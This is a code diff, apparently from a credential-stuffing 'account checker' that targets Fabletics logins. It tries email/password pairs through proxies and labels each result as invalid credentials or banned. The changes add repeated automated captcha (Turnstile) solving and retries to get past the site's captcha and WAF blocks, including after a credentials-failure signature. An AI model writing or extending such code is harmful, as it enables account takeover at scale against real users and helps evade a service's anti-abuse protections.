@@ -345,44 +345,65 @@ def _solve_and_retry(
             password=password,
             message=f"{reason} — set TURNSTILE_SITE_KEY",
         )
-    try:
-        token = solve_login_captcha(
-            timeout=min(timeout * 2, 120),
-            proxy=client.proxy_url,
-        )
-    except Exception as solve_exc:
-        return CheckResult(
-            status="BAN",
-            email=email,
-            password=password,
-            message=f"Captcha solve failed: {solve_exc}",
-        )
-    if not token:
-        return CheckResult(
-            status="BAN",
-            email=email,
-            password=password,
-            message=f"{reason} — solver returned empty token",
-        )
-    try:
-        guest_token = client.create_guest_session()
-        return _attempt_check(
-            client,
-            email,
-            password,
-            recaptcha_response=token,
-            guest_token=guest_token,
-            timeout=timeout,
-        )
-    except FableticsAPIError as retry_exc:
-        if _auth_failure_after_captcha(retry_exc, str(retry_exc)):
-            return CheckResult(
-                status="FAIL",
+
+    solve_timeout = min(timeout * 2, 120)
+    max_attempts = max(1, int(os.environ.get("FABLETICS_CAPTCHA_RETRIES", "3")))
+    last_ban: CheckResult | None = None
+
+    for attempt in range(max_attempts):
+        try:
+            token = solve_login_captcha(timeout=solve_timeout, proxy=client.proxy_url)
+        except Exception as solve_exc:
+            last_ban = CheckResult(
+                status="BAN",
                 email=email,
                 password=password,
-                message="Invalid credentials",
+                message=f"Captcha solve failed: {solve_exc}",
             )
-        return _classify_api_error(retry_exc, email, password)
+            continue
+        if not token:
+            last_ban = CheckResult(
+                status="BAN",
+                email=email,
+                password=password,
+                message=f"{reason} — solver returned empty token",
+            )
+            continue
+        try:
+            guest_token = client.create_guest_session()
+            return _attempt_check(
+                client,
+                email,
+                password,
+                recaptcha_response=token,
+                guest_token=guest_token,
+                timeout=timeout,
+            )
+        except FableticsAPIError as retry_exc:
+            message = str(retry_exc)
+            if _auth_failure_after_captcha(retry_exc, message):
+                return CheckResult(
+                    status="FAIL",
+                    email=email,
+                    password=password,
+                    message="Invalid credentials",
+                )
+            if _needs_captcha_solve(retry_exc, message) and attempt + 1 < max_attempts:
+                last_ban = CheckResult(
+                    status="BAN",
+                    email=email,
+                    password=password,
+                    message="Login gateway blocked (captcha/WAF)",
+                )
+                continue
+            return _classify_api_error(retry_exc, email, password)
+
+    return last_ban or CheckResult(
+        status="BAN",
+        email=email,
+        password=password,
+        message=f"{reason} — captcha retries exhausted",
+    )
 
 
 def _check_hard_timeout(timeout: int) -> int:
@@ -417,15 +438,6 @@ def _check_account_inner(
                 message="No password login for this email",
             )
 
-        if _login_needs_captcha(client, email, guest_token):
-            return _solve_and_retry(
-                client,
-                email,
-                password,
-                timeout,
-                "Login requires captcha",
-            )
-
         try:
             return _attempt_check(
                 client,
@@ -436,20 +448,17 @@ def _check_account_inner(
             )
         except FableticsAPIError as exc:
             message = str(exc)
-            if _needs_captcha_solve(exc, message):
+            if (
+                _login_needs_captcha(client, email, guest_token)
+                or _needs_captcha_solve(exc, message)
+                or exc.response_sig == _INVALID_CREDENTIALS_SIG
+            ):
                 return _solve_and_retry(
                     client,
                     email,
                     password,
                     timeout,
                     "Login gateway blocked (captcha/WAF)",
-                )
-            if _auth_failure_after_captcha(exc, message):
-                return CheckResult(
-                    status="FAIL",
-                    email=email,
-                    password=password,
-                    message="Invalid credentials",
                 )
             return _classify_api_error(exc, email, password)
     except FableticsAPIError as exc:
